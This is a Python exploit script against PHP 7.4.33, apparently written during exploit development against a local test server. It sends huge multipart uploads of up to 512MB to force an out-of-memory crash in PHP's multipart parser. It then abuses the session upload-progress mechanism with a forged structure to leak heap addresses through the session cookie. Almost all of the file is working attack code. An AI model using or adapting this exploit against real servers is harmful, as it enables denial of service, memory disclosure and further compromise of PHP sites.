"""Try to trigger OOM in the multipart parser on 7.4.33.
The key insight: the OOM needs to happen in the multipart parser (not in a PHP
script) because the multipart parser has a NULL-deref bug that crashes the worker
in a way that leaves PS(id) corrupted.

Let me try different approaches to trigger the OOM in the multipart parser:
1. Very large header
2. Very large cookie
3. Malformed multipart
4. Multiple large fields
"""
import sys, os, time, struct, http.client
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18108/"
t = E.Target(URL, timeout=180.0, verbose=False)

def try_leak(label):
    """Try to leak after a potential OOM trigger."""
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})

    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
        raw = E.parse_cookie(r2)
        oom = len(raw) > 100
        c = Counter()
        for i in range(0, len(raw) - 8, 8):
            v = int.from_bytes(raw[i:i + 8], "little")
            if 0x700000000000 <= v < 0x800000000000:
                c[v & ~0x1FFFFF] += 1
        chunk = c.most_common(1)[0][0] if c else 0
        tag = " *** OOM/LEAK ***" if oom else "(no OOM)"
        chunk_str = f" chunk=0x{chunk:x}" if chunk else ""
        print(f"    {label}: cookie={len(raw)}B{tag}{chunk_str}", flush=True)
        return oom
    except Exception as e:
        print(f"    {label}: ERROR: {e}", flush=True)
        return False

print("=== Multipart OOM test on 7.4.33 ===", flush=True)

# Test 1: Normal request (control)
print("\n--- Test 1: Normal request (control) ---", flush=True)
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [
    {"name": "PHPSESSID", "data": b"\x00"},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    {"name": "f", "filename": "a.txt", "data": b"A" * 64},
]
parts.append({"name": "big", "data": b"B" * int(12 * 1024 * 1024)})  # 12MB
try:
    r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
    print(f"  Request 1: {len(r1)}B", flush=True)
except Exception as e:
    print(f"  REQUEST1 ERROR: {e}", flush=True)
time.sleep(0.5)
try_leak("control")
time.sleep(1)

# Test 2: 256MB field (should trigger OOM if no per-field limit)
print("\n--- Test 2: 256MB field ---", flush=True)
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [
    {"name": "PHPSESSID", "data": b"\x00"},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    {"name": "f", "filename": "a.txt", "data": b"A" * 64},
]
parts.append({"name": "big", "data": b"B" * int(256 * 1024 * 1024)})  # 256MB
try:
    r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
    print(f"  Request 1: {len(r1)}B", flush=True)
except Exception as e:
    print(f"  REQUEST1 ERROR: {e}", flush=True)
time.sleep(0.5)
try_leak("256MB field")
time.sleep(1)

# Test 3: 512MB field
print("\n--- Test 3: 512MB field ---", flush=True)
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [
    {"name": "PHPSESSID", "data": b"\x00"},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    {"name": "f", "filename": "a.txt", "data": b"A" * 64},
]
parts.append({"name": "big", "data": b"B" * int(512 * 1024 * 1024)})  # 512MB
try:
    r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
    print(f"  Request 1: {len(r1)}B", flush=True)
except Exception as e:
    print(f"  REQUEST1 ERROR: {e}", flush=True)
time.sleep(0.5)
try_leak("512MB field")

print("\n=== done ===", flush=True)
